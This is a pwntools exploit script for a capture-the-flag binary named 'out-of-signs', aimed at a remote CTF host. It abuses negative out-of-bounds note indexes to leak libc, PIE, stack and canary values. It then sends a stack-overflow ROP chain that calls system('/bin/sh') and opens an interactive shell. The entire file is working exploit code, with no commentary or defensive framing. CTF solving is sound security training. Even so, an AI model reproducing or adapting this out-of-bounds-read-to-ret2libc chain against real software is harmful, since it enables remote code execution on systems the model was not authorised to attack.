#!/usr/bin/env python3
from pwn import *

elf = ELF('./out-of-signs')
rop = ROP(elf)
libc = ELF('./libc.so.6')

ld = ELF('./ld-linux-x86-64.so.2')

context(log_level='debug', binary=elf)

if args.REMOTE:
	io = remote('ccsc.mouflonarena.com', 31408)
elif args.GDB:
	io = process(elf.path)
	gdb.attach(io)
else:
	io = process(elf.path)

def view(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx).encode())
    return io.recv(16)

def add(data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', data)

leak_m3 = view(-3)
leak_m6 = view(-6)

stdin_leak = u64(leak_m3[0:8])    
dso_leak = u64(leak_m6[8:16])

log.success(f"_IO_2_1_stdin_ leak : {hex(stdin_leak)}")
log.success(f"__dso_handle leak : {hex(dso_leak)}")

libc.address = stdin_leak - libc.symbols['_IO_2_1_stdin_']
elf.address  = dso_leak - elf.symbols['__dso_handle']

log.success(f"libc base: {hex(libc.address)}")
log.success(f"PIE base : {hex(elf.address)}")

notes_base = elf.address + 0x4060
dt_debug_ptr_addr = elf.address + 0x3e48

diff = dt_debug_ptr_addr - notes_base
remainder = diff % 16
aligned_target = dt_debug_ptr_addr - (diff % 16)

pidx = (aligned_target - notes_base) // 16
nidx = pidx - (1 << 60)

data = view(nidx)
r_debug_leak = u64(data[remainder : remainder+8])
log.success(f"r_debug leak: {hex(r_debug_leak)}")

libc_stack_end_off = 0x16e8
libc_stack_end_addr = r_debug_leak - libc_stack_end_off

diff = libc_stack_end_addr - notes_base
remainder = diff % 16
aligned_target = libc_stack_end_addr - remainder

pidx = (aligned_target - notes_base) // 16
nidx = pidx - (1 << 60)

libc_stack_end = view(nidx)
stack_leak = u64(libc_stack_end[remainder : remainder+8])
log.success(f"stack leak (__libc_stack_end): {hex(stack_leak)}")

canary_off = 0x88 
canary_addr = stack_leak - canary_off 

diff = canary_addr - notes_base
remainder = diff % 16
aligned_target = canary_addr - remainder

pidx = (aligned_target - notes_base) // 16
nidx = pidx - (1 << 60)

data = view(nidx)
canary = u64(data[remainder : remainder+8])
log.success(f"canary: {hex(canary)}")

libc_rop = ROP(libc)
pad = b'A' * 24
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
system = libc.symbols['system']
ret = libc_rop.find_gadget(['ret'])[0]

payload = flat(
	pad,
	canary,
	b'FAKE_RBP',
	ret,
	pop_rdi,
	binsh,
	system
)
add(payload)
io.interactive()